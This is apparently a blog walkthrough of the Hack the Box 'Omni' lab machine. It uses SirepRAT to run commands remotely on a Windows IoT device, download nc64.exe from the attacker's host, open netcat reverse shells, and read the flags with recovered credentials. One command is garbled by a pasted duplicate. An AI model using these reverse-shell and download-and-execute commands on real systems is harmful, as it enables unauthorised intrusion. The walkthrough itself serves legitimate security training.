+++
author = "Nick"
categories = ["hack the box", "easy", "windows 10", "iot", "reverse shell", "Powershell", "sireprat"]
date = 2021-01-09T15:08:51Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/10/info-1.png"
slug = "hack-the-box-omni"
summary = "Welcome back everyone. Today we are doing the Hack the Box machine - Omni. This machine is different than most other machines. This is an IoT device! I'm excited to jump into this puzzle, let's go!"
tags = ["hack the box", "easy", "windows 10", "iot", "reverse shell", "Powershell", "sireprat"]
title = "Hack the Box - Omni"

+++


Welcome back everyone. Today we are doing the Hack the Box machine - Omni. This machine is different than most other machines. This is an IoT device! I'm excited to jump into this puzzle, let's go!

As usual, `nmap` it: `nmap -sC -sV -p- -oA allscan 10.10.10.204`

Here are our results:
```
Nmap scan report for 10.10.10.204
Host is up (0.065s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.91%I=7%D=10/27%Time=5F98741B%P=x86_64-pc-linux-gnu%r(
SF:NULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,
SF:"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x
SF:04G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\
SF:xc9}\xc8O\x12");
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

```

We have some interesting ports. We see `IIS`, we have some kind of ARCserve service running as well. When we browse to port 8080 we get the auth prompt. The [default credentials](https://learn.adafruit.com/getting-started-with-windows-iot-on-raspberry-pi/prepare-raspberry-pi) are a no go. However, googling around does lead us to a tool that can break the box right open - [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT).

Now we could just rip the SAM from the machine and call it a day, but I don't think that's the intended method here ;). First we'll `git clone` the repo. The following command can give us some info on where to start looking for our flags.

Command:
```
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/C cd C:/ \&& dir /b/s *.txt" --v
```

This will tell us where our flags are located, thus giving us an idea of our targets and some user account info.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-31.png" >}}

Now we know some basic info and what we're after. How do we obtain it? We have the ability to upload files to the system, in this case we can upload `nc.exe` and get a shell back to us. Now there are a few things to remember in this case. We need a place to put it where we have access, luckily we [know those](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#applocker-writable-windows-directories). We also need to ensure we format our command correctly and have a `SimpleHTTPServer` running on port 80.

Command:
```
python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -outfile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -uri 10.10.14.169/nc64.exe" --v
```

{{< figure src="__GHOST_URL__/content/images/2020/11/image.png" >}}

We see that our `nc64.exe` file was downloaded to the location we specified. now we simply need to execute the application to shell back to us. First we'll start up out `netcat` listener.

Command:
`nc -lvnp 6666`

Next we'll execute the command to connect back to us.

Command:
```
python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.169 6666 -e powershell.exe" --v
```

{{< figure src="__GHOST_URL__/content/images/2020/11/image-1.png" >}}

We get our shell back instantly. Now we'll download an enumeration script and see what we can find. In this case we downloaded `WinPEAS`.

Command:
`invoke-webrequest -outfile 'C:\Windows\system32\spool\drivers\color\wp.bat' -uri 10.10.14.169/winPEAS.bat`

Running this files doesn't really help us much though. It's missing some components that are not included in the IoT Windows 10 version. Looks like we'll enumerate by hand. The first thing I did was search for `.bat` and `.txt` files.

Command:
`get-childitem -Path C:\ -Include *.bat* -recurse -erroraction Silentlycontinue`

Nothing too useful there. We'll repeat the steps this time, with hidden flag enabled as well as a time filter. We essentially want items that have been modified after the creation of the box. This way we can eliminate potential junk files from an image.

Command:
`get-childitem -Path C:\ -include *.bat*,*.txt* -recurse -erroraction silentlycontinue -hidden| ? {$_.lastwritetime -gt '8/20/20'}`

This finds an interesting file - `r.bat` - in an interesting location.

{{< figure src="__GHOST_URL__/content/images/2020/11/image-2.png" >}}

When we look in the file, we see some credentials!

{{< figure src="__GHOST_URL__/content/images/2020/11/image-3.png" >}}

Now with some credentials, we can try to access that page being hosted on `8080`. Sure enough, we get in!

{{< figure src="__GHOST_URL__/content/images/2020/11/image-4.png" >}}

Now poking around this system, we see there is a function to run commands. Well great but it's possible that we are going to only run our command as our current user. Now, we can try to login to this portal as the administrator credentials that we just found. Sure enough, they work! Now, we can run commands as administrator! Let's create another shell back, this time with admin priv's.

Command:
`C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.14.169 7777 -e powershell.exe`

We also want to ensure that we have our listener running.

Command:
`nc -lvnp 7777`

{{< figure src="__GHOST_URL__/content/images/2020/11/image-5.png" >}}

Sure enough, we catch our shell back!

{{< figure src="__GHOST_URL__/content/images/2020/11/image-6.png" >}}

With admin at our disposal, we check the `root.txt` file. Looks like it's a XML file that needs to be run through powershell to get the value. Fun. We can quickly get our value by using `import-clixml`, you can read up on that [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7).

Commands:
`$cred = import-clixml -Path C:\Data\Users\Administrator\root.txt`
`$cred.GetNetworkCredential().Password`

I suppose you could have done this first when you get access as `app`, but when I realized you could run commands as app, I jumped right to `admin`. You need to log into the app portal as `app` with `mesh5143` as the password, and catch a shell there as well.



